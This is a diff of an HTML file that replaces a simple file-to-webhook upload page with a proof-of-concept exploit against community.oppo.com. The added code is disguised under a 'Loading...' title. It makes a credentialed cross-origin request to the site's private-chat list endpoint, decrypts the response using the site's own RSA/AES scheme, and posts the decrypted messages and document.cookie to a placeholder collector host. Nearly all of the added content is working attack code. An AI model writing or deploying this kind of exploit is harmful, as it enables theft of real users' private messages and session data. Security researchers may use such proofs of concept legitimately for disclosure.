@@ -1,117 +1,96 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="utf-8" />
-  <title>Upload files/folder to webhook</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; margin: 2rem; }
-    .row { margin: 0.75rem 0; }
-    button { padding: 0.6rem 1rem; cursor: pointer; }
-    #log { white-space: pre-wrap; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
-  </style>
+<title>Loading...</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
 </head>
 <body>
-  <h1>Upload to Webhook</h1>
-
-  <div class="row">
-    <label>
-      <strong>Select files</strong>
-      <input id="files" type="file" multiple />
-    </label>
-  </div>
-
-  <div class="row">
-    <label>
-      <strong>Or select a folder</strong> (Chrome/Edge/Brave)
-      <input id="folder" type="file" webkitdirectory directory multiple />
-    </label>
-  </div>
-
-  <div class="row">
-    <label>
-      Webhook URL:
-      <input id="url" type="url" style="width: 32rem;"
-             value="https://webhook.site/6fa99692-c961-412d-92c1-d11cb3137ca3" />
-    </label>
-  </div>
-
-  <div class="row">
-    <button id="send">Send selection</button>
-  </div>
-
-  <div id="log"></div>
-
 <script>
-(async () => {
-  const $ = id => document.getElementById(id);
-  const log = msg => { $('log').textContent += msg + "\n"; };
+// ============ CONFIG ============
+const TARGET = "https://community.oppo.com";
+const ENDPOINT = "/ajax/chat/frontend/chat-private/list?page=1&limit=20";
+const EXFIL = "https://YOUR_COLLABORATOR/collect";
+const RSA_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAps_1ZfXF4GQHIdjhkjoNQNF9zmnSfXYonbv2b5T58UlZ4yUVSeIKkguVt8FAQ6gDrbocCXjC6O74vcRV0eRIcWXFnFE_y69PRg53XWaMZhV9OzXxc2i0Z5Al3uMhySx8V8h3tJ-ptII64b6Xp3MkCao4_ktqXybh0Fsk24W_c3lYbbRSqcc4_H_FcundKq-BFvRk9TerYKvHEGu7Laui0-l0o3qeef4L8h1wYZCjaqvoiNdjkWTn338q1EtOm3DFzB5S31A2chtOd-ReVQo6ydsOmU83RkR0W2UiZe96w9BXAXBSQDIi2BT-38dgOza1LjhYA-y_hBA7q1izgQVGXQIDAQAB";
 
-  function collectFiles() {
-    // Merge files from both pickers; de-duplicate by name+size+lastModified
-    const set = new Map();
-    const addList = (list) => {
-      for (const f of list) {
-        const key = `${f.name}:${f.size}:${f.lastModified}`;
-        if (!set.has(key)) set.set(key, f);
-      }
-    };
-    addList($('files').files);
-    addList($('folder').files);
-    return Array.from(set.values());
+// ============ STEP 1: Generate AES Key & IV ============
+function u(n) {
+  const t = ["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"];
+  let e = "";
+  for (let c = 0; c < n; c++) {
+    const r = Math.ceil(Math.random() * 35);
+    e += t[r];
+  }
+  return e;
+}
+
+const aesKey = u(16);
+const aesIV = u(16);
+const raw = `${aesIV}${aesKey}`;
+
+// ============ STEP 2: RSA Encrypt (PKCS#1 v1.5) ============
+function rsaEncrypt(text) {
+  const standardBase64 = RSA_KEY_BASE64.replace(/-/g, "+").replace(/_/g, "/");
+  const pemKey = `-----BEGIN PUBLIC KEY-----\n${standardBase64}\n-----END PUBLIC KEY-----`;
+  const encrypt = new JSEncrypt();
+  encrypt.setPublicKey(pemKey);
+  return encrypt.encrypt(text);
+}
+
+const keyParam = rsaEncrypt(raw);
+
+// ============ STEP 3: Make CORS Request ============
+fetch(`${TARGET}${ENDPOINT}&key=${encodeURIComponent(keyParam)}`, {
+  method: "GET",
+  credentials: "include",
+  headers: {
+    "Accept": "application/json, text/plain, */*"
+  }
+})
+.then(response => response.text())
+.then(encryptedData => {
+  
+  // ============ STEP 4: AES Decrypt Response ============
+  let decrypted;
+  try {
+    const keyWA = CryptoJS.enc.Utf8.parse(aesKey);
+    const ivWA = CryptoJS.enc.Utf8.parse(aesIV);
+    const decryptedBytes = CryptoJS.AES.decrypt(encryptedData, keyWA, {
+      iv: ivWA,
+      mode: CryptoJS.mode.CBC,
+      padding: CryptoJS.pad.Pkcs7
+    });
+    decrypted = decryptedBytes.toString(CryptoJS.enc.Utf8);
+  } catch(e) {
+    // Fallback: maybe response is not encrypted
+    decrypted = encryptedData;
   }
 
-  $('send').addEventListener('click', async () => {
-    const files = collectFiles();
-    if (!files.length) {
-      log('Please choose at least one file or a folder.');
-      return;
-    }
-
-    const webhook = $('url').value.trim();
-    if (!/^https?:\/\//i.test(webhook)) {
-      log('Invalid webhook URL.');
-      return;
-    }
-
-    // Build multipart form payload
-    const form = new FormData();
-    // Include relative path when available (webkitRelativePath preserves folder structure)
-    for (const f of files) {
-      const rel = f.webkitRelativePath || f.name;
-      form.append('files[]', f, rel);
-    }
-
-    // Header summary (keep small!)
-    const names = files.slice(0, 50).map(f => f.webkitRelativePath || f.name);
-    const headerSummary = names.join(',');
-
-    log(`Uploading ${files.length} file(s) to ${webhook} ...`);
-
-    try {
-      const res = await fetch(webhook, {
-        method: 'POST',
-        // Note: Let the browser set the multipart boundary Content-Type for FormData
-        body: form,
-        headers: {
-          // Keep headers tiny; many servers limit header size (~8–16 KB total)
-          'X-Files-Summary': headerSummary
-        },
-        // If the webhook does not send CORS headers, you can use no-cors,
-        // but you won’t be able to read the response in the page:
-        // mode: 'no-cors'
-      });
-
-      // If CORS is allowed, show status; otherwise this may throw due to opaque response
-      log(`Done. HTTP status: ${res.status} ${res.statusText}`);
-      const text = await res.text().catch(() => '');
-      if (text) log(`Response body:\n${text}`);
-    } catch (e) {
-      log('Upload finished (or blocked by CORS). Check your webhook dashboard to verify receipt.');
-      log(String(e));
-    }
+  // ============ STEP 5: Exfiltrate ============
+  fetch(EXFIL, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "text/plain" },
+    body: JSON.stringify({
+      url: TARGET + ENDPOINT,
+      aes_key: aesKey,
+      aes_iv: aesIV,
+      key_param: keyParam,
+      raw_response: encryptedData.substring(0, 2000),
+      decrypted: decrypted,
+      cookies: document.cookie,
+      time: new Date().toISOString()
+    })
   });
-})();
+
+})
+.catch(err => {
+  fetch(EXFIL, {
+    method: "POST",
+    mode: "no-cors",
+    body: JSON.stringify({ error: err.message })
+  });
+});
 </script>
 </body>
 </html>
